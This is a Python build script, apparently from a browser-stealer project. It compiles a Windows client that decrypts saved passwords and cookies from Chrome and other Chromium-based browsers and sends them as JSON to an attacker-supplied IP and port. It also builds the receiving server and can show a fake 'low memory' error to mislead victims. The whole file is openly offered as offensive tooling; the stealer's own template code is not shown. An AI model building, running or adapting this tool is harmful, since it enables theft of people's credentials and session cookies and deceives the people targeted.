# -*- coding: utf-8 -*-
"""Creates an Executable that decrypts and sends Chrome passwords and cookies

This script will make use of pyinstaller to create an executable
version of itself.
The executable's functionality is to decrypt Google Chrome
saved passwords and cookies, sending them as a json file to an attacker
through http connection.

Note: To include a custom icon, change the icon for the server or client in the icons directory"""

from _modules import setup
import PyInstaller.__main__
import os
import shutil
import argparse
import socket
import subprocess
import logging
import configparser
import stat

config = configparser.ConfigParser()
config.read("config.ini")
template_dir = config["DIRECTORIES"]["TemplateDir"]
build_dir = config["DIRECTORIES"]["BuildDir"]
dist_dir = config["DIRECTORIES"]["DistDir"]
icon_dir = config["DIRECTORIES"]["IconDir"]
chromepass_base = config["DIRECTORIES"]["ChromePassBase"]
template_base = config["DIRECTORIES"]["ClientTemplateBase"]
log_dir = config["DIRECTORIES"]["LogDir"]


def rmtree(top):
    for root, dirs, files in os.walk(top, topdown=False):
        for name in files:
            filename = os.path.join(root, name)
            os.chmod(filename, stat.S_IWRITE)
            os.remove(filename)
        for name in dirs:
            os.rmdir(os.path.join(root, name))
    os.rmdir(top)


def reset_folders():
    if os.path.exists(build_dir):
        rmtree(build_dir)
    if not os.path.exists(dist_dir):
        os.mkdir(dist_dir)


def compile_client(build_command):
    try:
        build = subprocess.Popen(
            ["powershell.exe", build_command], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        for line in iter(build.stdout.readline, b''):
            line = line.decode(encoding="ISO-8859-1")
            print(line)
            logging.debug(line)
        return True
    except Exception as e:
        pass
    return False


def create_executable(filename, icon, mode="windowed"):
    PyInstaller.__main__.run([
        '--clean',
        '--onefile',
        f"--{mode}",
        f'--workpath={build_dir}',
        f'--icon={icon_dir}/{icon}',
        f"{build_dir}/{filename}.py",
        f'--distpath={build_dir}/dist',
    ])


def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", error_bool=False, error_message="None", nocookies=False, nologin=False, port=80, nobuild=True):
    temp_path = f"{template_dir}/{filename}"
    build_path = f"{template_dir}/{chromepass_base}/src/main.rs"
    build_command = f"cd {build_dir}\\{chromepass_base}; cargo build --release;"
    if os.path.exists(temp_path) and not nobuild:
        print("[+] Building Client")
        shutil.copytree(f"{template_dir}/{chromepass_base}",
                        f"{build_dir}/{chromepass_base}")
        shutil.copyfile(f"{icon_dir}/{icon}",
                        f"{build_dir}/{chromepass_base}/icon.ico")
        with open(temp_path, "r") as f:
            content = f.read()
        content = content.replace("<<IP_ADDRESS>>", ip_address)
        content = content.replace(
            "<<ERROR_BOOL>>", "true" if error_bool else "false")
        content = content.replace("<<ERROR_MESSAGE>>", error_message)
        content = content.replace(
            "<<COOKIES_BOOL>>", "true" if nocookies else "false")
        content = content.replace(
            "<<LOGIN_BOOL>>", "true" if nologin else "false")
        content = content.replace("<<PORT>>", f"{port}")
        with open(build_path, "w") as f:
            f.write(content)
        print(build_command)
        if compile_client(build_command):
            shutil.copyfile(
                f"{build_dir}/{chromepass_base}/target/release/chromepass.exe", f"{dist_dir}/{filename}.exe")
            print("[+] Client build Successful")
            return True
    else:
        print(f"[-] Error, file not found: {temp_path}")
    return False


def build_server(filename="server", icon="server.ico", port=80, include_python=False, nobuild=True):
    temp_path = f"{template_dir}/{filename}"
    build_path = f"{build_dir}/{filename}.py"
    dist_path = f"{dist_dir}/{filename}"
    if os.path.exists(temp_path):
        with open(temp_path, "r") as f:
            content = f.read()
        content = content.replace("<<PORT>>", f"{port}")
        with open(build_path, "w") as f:
            f.write(content)
        if include_python:
            print("[+] Creating python Server")
            shutil.copyfile(build_path, f"{dist_path}.py")
        if not nobuild:
            print("[+] Building Server")
            create_executable(filename, icon, mode="console")
            if os.path.exists(dist_path):
                shutil.rmtree(dist_path)
            shutil.copyfile(f"{build_dir}/dist/{filename}.exe",
                            f"{dist_dir}/{filename}.exe")
            if os.path.exists(f"{filename}.spec"):
                os.remove(f"{filename}.spec")
        print("[+] Server build successful.")
        return True
    print(f"[-] Error, file not found: {temp_path}")
    return False


def build_message(server, client):
    os.system("cls")
    if not server:
        print(f"[-] Error building the server")
    if not client:
        print(f"[-] Error building the client")
    if server and client:
        print(
            f"[+] Build was successful. The file(s) should be in the directory: {dist_dir}")
    reset_folders()


def check_valid_port(port):
    try:
        port = int(port)
        if 0 < port < 65535:
            return port
        raise argparse.ArgumentTypeError(
            f"Port {port} is invalid. Please use numbers between 1 and 65534")
    except ValueError:
        raise ValueError(f"Port needs to be an integer")


def parse_arguments():
    error_message = "There isn't enough memory to complete this action. Try using less data or closing other applications."
    parser = argparse.ArgumentParser(
        description='Creates a server and client to steal credentials and cookies from Chromium-based browsers: (Chrome, Chromium, Edge, Brave, etc...)')
    parser.add_argument('--ip', metavar="IP", type=str, default="127.0.0.1",
                        help="IP address to connect to, or reverse dns. Default is 127.0.0.1")
    parser.add_argument('--port', metavar="PORT", type=check_valid_port, default=80,
                        help="Port to host the server, deafult is 80")
    parser.add_argument('--error', dest="error_bool",
                        action="store_true", default=False, help="Use this to enable the error message. Default is False")
    parser.add_argument('--message', metavar="Error Message",
                        type=str, help="Use to set the error message. The default is low memory error.", default=error_message)
    parser.add_argument('--nocookies', dest="cookies_bool",
                        action="store_true", default=False, help="Use to only capture credentials and not cookies. Default is both")
    parser.add_argument('--nologin', dest="login_bool",
                        action="store_true", default=False, help="Use to only capture cookies and not credentials. Default is both")
    parser.add_argument('--pyserver', dest="pyserver",
                        action="store_true", default=False, help="Creates a python version of the server. Pair it with --nobuild-server to only have it as python")
    parser.add_argument('--nobuild_server', dest="noserver",
                        action="store_true", default=False, help="Doesn't build the server")
    parser.add_argument('--nobuild_client', dest="noclient",
                        action="store_true", default=False, help="Doesn't build the client")

    args = parser.parse_args()
    try:
        socket.gethostbyname(args.ip)
    except:
        print("The ip address is wrong, please try again")
        return False

    reset_folders()
    os.mkdir(build_dir)
    server = build_server(
        port=args.port, include_python=args.pyserver, nobuild=args.noserver)
    client = build_client(ip_address=args.ip, error_bool=args.error_bool, error_message=args.message,
                          nocookies=args.cookies_bool, nologin=args.login_bool, port=args.port, nobuild=args.noclient)
    build_message(server, client)


if __name__ == "__main__":
    parse_arguments()
